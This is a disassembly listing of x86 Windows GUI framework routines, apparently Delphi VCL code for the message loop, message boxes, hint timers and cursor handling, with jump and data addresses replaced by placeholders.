mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45ddc8
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45dcc0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45dd10
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45dc9c
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45df00
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45de68
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45e7d0
sub_45df24
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413a54
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413918
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45df80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413a74
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413964
jmp r-xdata
sub_45e014
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403730#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_444944
mov [ esi + 0x44 ] edi
sub_45e094
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45e172
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_454fa4
call sub_407b90
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e179
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_458788
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403730#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45df00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_457690
mov eax [ ebp - 0x4 ]
call sub_45da64
jmp r-xdata
sub_45e194
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b3c8
call sub_40274c
mov edx [ rw-data ]
call sub_40341c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_45e38c
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45e224
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45502c
mov [ ebp - 0x10 ] eax
call sub_454f48
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45d1c8
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45e379
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e380
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4550e0
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_454f50
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45e38c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e447
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404078
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45dc50
mov eax [ ebp - 0x108 ]
call sub_4044a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
mov edx eax
mov eax ebx
pop ecx
call sub_45e224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e44e
lea eax [ ebp - 0x108 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
call sub_408398
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402da0
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402bb8
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042a8
sub_45e464
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_444b04
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_444c6c
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45eb08
test al al
je r-xdata
call sub_444968
mov ebp eax
mov eax edi
call sub_444968
mov ebp eax
mov eax esi
call sub_45eb08
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45e5cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45e624
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45eb08
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45f354
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e62b
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_45e634
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45e68c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45eb08
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45f354
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e693
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_45e6a4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403290
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43e2ec
jmp r-xdata
sub_45e6f4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45bca0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_444968
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bc8c
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax ebx
call sub_444968
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45e758
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43c9f8
mov edi eax
call sub_43b2f4
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43f334
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43f334
sub_45e7d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e8e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45e758
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45c808
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43b25c
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45e990
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45e887
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45ed28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e6f4
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41928c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e8e7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45e8f0
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45bc84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45bc70
movzx edx di
xor ecx ecx
call sub_43f334
inc esi
dec ebx
jne r-xdata
sub_45e92c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45da48
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45da48
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45e8f0
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45e990
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4043ec
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_404034
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437a1c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44ac68
xor eax eax
push ebp
push sub_45ea15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45ea24
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45ea80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45bc84
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45ea24
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bc70
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45ea24
pop ecx
jmp r-xdata
mov eax ebx
call sub_444c6c
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_444968
push eax
call IsChild
test eax eax
jne r-xdata
sub_45eb08
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40564c
call sub_424a34
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45eb30
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45eb74
push sub_45c860
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45ed28
sub_45eb9c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069fc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43dc64
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43c9f8
call sub_45c840
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45ed28
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069fc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43dc64
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45ed28
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45eb30
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43f334
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45efc0
jmp r-xdata
sub_45ecac
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45eb74
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45efc0
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45ece4
jmp r-xdata
sub_45ece4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_444c6c
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_444968
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_444968
push eax
call ShowWindow
sub_45ed28
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45ece4
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45c9c8
mov eax ebx
call sub_45eb74
sub_45ed60
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45eea2
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41ea20
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407b44
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45ee73
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41ead8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee7a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45ed50
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45ed50
mov [ ebp - 0x4 ] eax
sub_45ee7a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45eeb4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403290
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031d8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45ef14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45efae
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45efb5
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d5bc
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c074
mov ebx eax
inc ebx
sub_45efc0
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40494c
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45f346
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45ed28
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45eb30
jmp r-xdata
call sub_4551f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f34d
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a1c
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
